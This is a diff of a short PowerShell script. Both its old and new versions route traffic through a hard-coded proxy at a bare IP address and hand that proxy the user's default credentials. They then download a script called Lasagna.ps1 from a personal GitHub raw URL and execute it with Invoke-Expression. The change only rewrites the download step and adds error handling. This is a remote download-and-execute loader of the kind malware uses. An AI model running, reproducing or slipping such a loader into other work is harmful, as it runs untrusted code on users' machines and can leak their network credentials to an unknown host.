@@ -1,24 +1,23 @@
-# Set the proxy server information (replace with your proxy server details)
+# Set the HTTP proxy server information (replace with your proxy server details)
 $proxyServer = "43.157.8.79:8888"
 
-# Set the URL of the PowerShell script you want to run
+# Set the URL of the script you want to execute
 $scriptURL = "https://raw.githubusercontent.com/MarkDenkmn/MarkDenkmn/main/Lasagna.ps1"
 
-# Create a proxy object with credentials
-$proxy = New-Object System.Net.WebProxy
-$proxy.Address = $proxyServer
+# Create a proxy object
+$proxy = New-Object System.Net.WebProxy($proxyServer)
 
 # Set the proxy settings for the current session
 [system.net.webrequest]::defaultwebproxy = $proxy
-[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+[system.net.webrequest]::defaultwebproxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
 
-# Download the script content
-$webClient = New-Object System.Net.WebClient
-$webClient.Proxy = $proxy
-$scriptContent = $webClient.DownloadString($scriptURL)
-
-# Run the downloaded script
-Invoke-Expression -Command $scriptContent
+# Download and execute the script from the specified URL
+try {
+    $scriptContent = Invoke-WebRequest -Uri $scriptURL -Proxy $proxyServer -UseBasicParsing
+    Invoke-Expression -Command $scriptContent.Content
+} catch {
+    Write-Host "Error executing the script: $_"
+}
 
 # Remove the proxy settings to avoid affecting other PowerShell sessions
 [system.net.webrequest]::defaultwebproxy = $null
